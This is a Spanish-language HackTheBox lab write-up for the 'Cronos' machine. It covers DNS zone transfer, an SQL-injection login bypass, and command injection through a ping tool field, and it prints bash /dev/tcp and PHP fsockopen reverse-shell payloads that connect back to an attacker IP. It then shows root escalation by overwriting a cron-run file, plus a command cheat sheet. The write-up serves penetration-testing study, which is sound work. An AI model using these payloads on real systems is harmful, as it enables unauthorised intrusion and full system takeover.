[⏱️ Chronos — HTB [Linux · Easy] 36c15bd2d16c811eb12cecbafacf093a.md](https://github.com/user-attachments/files/28343523/Chronos.HTB.Linux.Easy.36c15bd2d16c811eb12cecbafacf093a.md)
# ⏱️ Chronos — HTB [Linux · Easy]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.227.211` |
| Dominio | `cronos.htb` / `admin.cronos.htb` |
| OS | Linux (Ubuntu) |
| Vector inicial | DNS zone transfer → subdominio admin → SQLi bypass → command injection |
| Usuario inicial | `www-data` (reverse shell vía Net Tool) |
| Escalada | Cron job PHP ejecutado como root → overwrite artisan → reverse shell |
| Root | `root` vía cron job cada minuto |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Tres puertos: SSH, DNS y HTTP. El DNS abierto es una señal importante — puede permitir zone transfer y revelar subdominios.

```bash
sudo nmap -sS --min-rate 5000 -p- -Pn -n -vvv 10.129.227.211 -oG allPorts
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image.png)
> 

## Nmap — versiones

OpenSSH 7.2p2 Ubuntu, ISC BIND 9.10.3-P4, Apache 2.4.18. http-title: Apache2 Ubuntu Default Page. OS: Linux kernel.

```bash
nmap -sVC -p22,53,80 10.129.227.211 -oN targeted
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image1.png)
> 

---

# 2. Enumeración DNS — Zone Transfer

El puerto 80 devuelve la página por defecto de Apache — no hay aplicación directamente. Con DNS abierto probamos reverse lookup y zone transfer para descubrir subdominios:

```bash
# Reverse lookup
dig -x 10.129.227.211 @10.129.227.211

# Zone transfer
dig axfr cronos.htb @10.129.227.211
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image2.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image3.png)
> 

Añadimos al `/etc/hosts`:

```
10.129.227.211 cronos.htb admin.cronos.htb www.cronos.htb
```

Visitamos `cronos.htb`:

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image4.png)
> 

---

# 3. Explotación — SQLi bypass en admin.cronos.htb

El subdominio `admin.cronos.htb` tiene un panel de login:

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image5.png)
> 

Probamos SQLi clásico de bypass en ambos campos:

```
UserName: ' or 1=1 -- -
Password: ' or 1=1 -- -
```

Acceso concedido. La aplicación es **Net Tool v0.1** — una herramienta de red con opciones `traceroute` y `ping` que ejecuta comandos en el servidor:

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image6.png)
> 

---

# 4. Command Injection — reverse shell como www-data

El campo de la herramienta de red ejecuta comandos del sistema sin sanitizar. Encadenamos una reverse shell con `;`:

```bash
# En el campo de Net Tool (modificado via Burp o directamente):
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.105/4444 0>&1'
```

```bash
# Listener en Kali:
nc -lvnp 4444
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image7.png)
> 

---

# 5. Enumeración post-explotación — cron job como root

Revisamos tareas cron del sistema:

```bash
cat /etc/crontab
```

> 
> 


> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image8.png)
Verificamos permisos sobre ese archivo:

```bash
ls -la /var/www/laravel/artisan
# www-data tiene permisos de escritura
```

Tenemos acceso de escritura como `www-data` sobre el archivo que ejecuta root cada minuto. Vector de escalada confirmado.

---

# 6. Escalada — Overwrite artisan con reverse shell PHP

Sobreescribimos el archivo `artisan` con una reverse shell PHP:

```bash
cat > /var/www/laravel/artisan << 'EOF'
<?php
$sock=fsockopen("10.10.14.105", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
EOF
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image9.png)
> 

Esperamos hasta que el cron ejecute (máximo 1 minuto):

```bash
nc -lvnp 443
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Cronos/assets/image10.png)
> 

---

# 7. Cadena de ataque

```
nmap → puerto 53 abierto (DNS)
    ↓
dig axfr cronos.htb → subdominios: admin.cronos.htb, www.cronos.htb
    ↓
admin.cronos.htb → panel login → SQLi bypass (' or 1=1 -- -)
    ↓
Net Tool v0.1 → command injection (;bash -c 'bash -i >& /dev/tcp/...')
    ↓
shell www-data
    ↓
cat /etc/crontab → * * * * * root php /var/www/laravel/artisan
    ↓
www-data tiene escritura en artisan → overwrite con reverse shell PHP
    ↓
nc -lvnp 443 → cron dispara → root shell → root.txt
```

---

# 8. Moralejas

## DNS abierto siempre merece un zone transfer

Cuando el puerto 53 está abierto, `dig axfr dominio @IP` es el primer comando. Un zone transfer exitoso revela toda la infraestructura DNS del dominio — subdominios, servidores, etc. En este caso revela `admin.cronos.htb` que es el vector de entrada. Sin el zone transfer, la máquina sería invisible.

## SQLi de bypass en login es el check más rápido ante cualquier formulario

Antes de enumerar parámetros o usar sqlmap, probar `' or 1=1 -- -` manual es cuestión de segundos. Si la consulta SQL no tiene prepared statements, cae instantáneamente. El patrón `' or 1=1 -- -` funciona en MySQL; para otros motores hay variantes (`' or '1'='1`, `admin'--`, etc.).

## Una herramienta de red en una web admin es casi siempre command injection

Cualquier campo que ejecute `ping`, `traceroute`, `nslookup` o similar en el servidor es candidato a command injection. El separador `;` (bash), `&&`, `||`, o `|` permite encadenar comandos. Siempre probar con un `ping -c 1 tu_IP` primero para confirmar ejecución antes de lanzar la reverse shell.

## Los cron jobs de root con archivos escribibles son escalada directa

Si un cron ejecuta un archivo que tu usuario puede sobreescribir, tienes root en el próximo tick. La búsqueda es: `cat /etc/crontab` + `ls -la` sobre cada archivo referenciado. En Linux también hay crons en `/etc/cron.d/`, `/var/spool/cron/`, y `crontab -l` por usuario.

## El patrón OSCP de esta máquina

```
DNS zone transfer → subdominio oculto
    ↓
SQLi bypass → acceso a panel
    ↓
Command injection → foothold
    ↓
Cron job root + archivo escribible → overwrite → root
```

Cadena limpia y clásica de Linux. Cada vector es diferente, ninguno requiere exploits complejos — todo configuración insegura. Exactamente el estilo OSCP.

---

# 9. Conceptos técnicos clave

**DNS Zone Transfer (AXFR):** Mecanismo de replicación entre servidores DNS. Si el servidor está mal configurado, cualquier cliente puede solicitar una transferencia completa de la zona y obtener todos los registros DNS: subdominios, IPs, servidores de correo, etc. `dig axfr dominio @servidor` lo solicita directamente.

**SQLi Auth Bypass:** La consulta vulnerable suele ser `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'`. Con `' or 1=1 -- -` como username, la consulta se convierte en `SELECT * FROM users WHERE username='' or 1=1 -- -' AND password='...'` — siempre verdadera, comentando el resto.

**Command Injection:** Ocurre cuando la entrada del usuario se concatena directamente en una llamada al sistema (`shell_exec`, `exec`, `system` en PHP). El separador `;` ejecuta un segundo comando independiente. La detección se hace con un ping a nuestra IP; la explotación con una reverse shell.

**Cron job hijacking:** Si un cron ejecuta un script que el atacante puede modificar, sobreescribir el script con un payload es suficiente para ejecutar código con los privilegios del usuario del cron (en este caso root). El timing máximo de espera es el intervalo del cron — aquí 1 minuto.

---

# 10. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.227.211
nmap -sVC -p22,53,80 10.129.227.211 -oN targeted

# DNS enumeration
dig -x 10.129.227.211 @10.129.227.211
dig axfr cronos.htb @10.129.227.211

# /etc/hosts:
# 10.129.227.211 cronos.htb admin.cronos.htb www.cronos.htb

# SQLi bypass (en el login de admin.cronos.htb)
# UserName: ' or 1=1 -- -
# Password: ' or 1=1 -- -

# Command injection en Net Tool
# Payload en el campo IP:
# 127.0.0.1; bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'

# Listener
nc -lvnp 4444

# Post-explotacion
cat /etc/crontab
ls -la /var/www/laravel/artisan

# Overwrite artisan con reverse shell PHP
cat > /var/www/laravel/artisan << 'EOF'
<?php
$sock=fsockopen("TU_IP", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
EOF

# Listener root
nc -lvnp 443

# Flags
cat /var/www/html/user.txt  # (si existe, buscar en /home/)
cat /root/root.txt
```
